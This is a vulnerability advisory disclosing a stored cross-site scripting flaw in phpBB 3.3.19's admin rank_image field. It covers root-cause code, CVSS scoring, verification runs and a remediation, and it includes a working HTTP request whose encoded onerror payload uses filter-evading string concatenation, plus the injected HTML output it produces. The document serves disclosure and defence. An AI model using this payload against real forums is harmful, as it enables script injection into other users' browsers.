# phpBB rank_image attribute stored XSS

## Summary

phpBB 3.3.19 contains stored cross-site scripting in rank image handling. The ACP rank editor accepts a rank_image value with an image suffix, decodes HTML entities, and stores quote characters that are later inserted into image src attributes without attribute encoding. A user with the a_ranks administrative permission can inject script that executes in the ACP ranks page, member profiles, and topic pages.

## Affected product

- Vendor/project: **phpBB Limited**
- Product: **phpBB**
- Affected version: **3.3.19**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (4.8)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Administrator with a_ranks permission; triggering viewers include ACP users and frontend visitors.

Verified flow: `ACP rank_image → html_entity_decode(ENT_COMPAT) → database → unescaped IMG src in three views`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a special rank whose rank_image contains a quote-breaking event attribute and ends with .svg.
2. Confirm the database stores literal quote characters after html_entity_decode.
3. View the rank in ACP, a member profile, and a topic page.

Sanitized request shape used during verification:

```http
# ACP user with a_ranks permission; form values redacted
POST <BASE_URL>/adm/index.php?i=acp_ranks&mode=ranks&sid=<SID>&id=0
Cookie: <ADMIN_SESSION_COOKIE>
Content-Type: application/x-www-form-urlencoded

title=gt481023pbcrk
special_rank=1&min_posts=0
rank_image=r.svg%22%20onerror%20%3D%20self%5B%60al%60%2B%60ert%60%5D%28%60gt481023pbc%60%29%20x%3D%22.svg
action=save&submit=Submit
creation_time=<FORM_VALUE>&form_token=<FORM_TOKEN>

GET <BASE_URL>/adm/index.php?i=acp_ranks&mode=ranks&sid=<SID>
GET <BASE_URL>/memberlist.php?mode=viewprofile&u=<RANKED_USER>
GET <BASE_URL>/viewtopic.php?t=<TOPIC_ID>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023pba` | DB hit + ACP/member/topic | **PASS** |
| 2 | `gt481023pbb` | DB hit + ACP/member/topic | **PASS** |
| 3 | `gt481023pbc` | DB hit + ACP/member/topic | **PASS** |

```text
Saved run-3 responses (same unescaped attribute in all sinks):

ACP:
<img src="./../images/ranks/r.svg" onerror = self[`al`+`ert`](`gt481023pbc`) x=".svg" ...>

Member profile and topic:
<img src="./images/ranks/r.svg" onerror = self[`al`+`ert`](`gt481023pbc`) x=".svg" ...>

The database value contained the literal quote-breaking string.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
includes/acp/acp_ranks.php:56-73
$rank_image = $request->variable('rank_image', '');
... suffix check for gif/png/jpg/jpeg/svg/webp ...
'rank_image' => html_entity_decode($rank_image, ENT_COMPAT)

adm/style/acp_ranks.html:88
<img src="{ranks.RANK_IMAGE}" ...>

includes/functions_display.php:1534
'<img src="' . $user_rank_data['img_src'] . '" ... />'
```

Root cause: rank_image accepts an image-looking suffix, decodes entities into literal quotes, and later enters src attributes without attribute encoding in three views.

## Recommended remediation

Store a canonical server-controlled filename. Reject path/quote characters and attribute-encode any value rendered into src.

## References

- Official source: https://github.com/phpbb/phpbb/blob/release-3.3.19/phpBB/includes/acp/acp_ranks.php

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-13 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-13/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-13 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-13/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-13 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-13/03-source-github-v3.png)
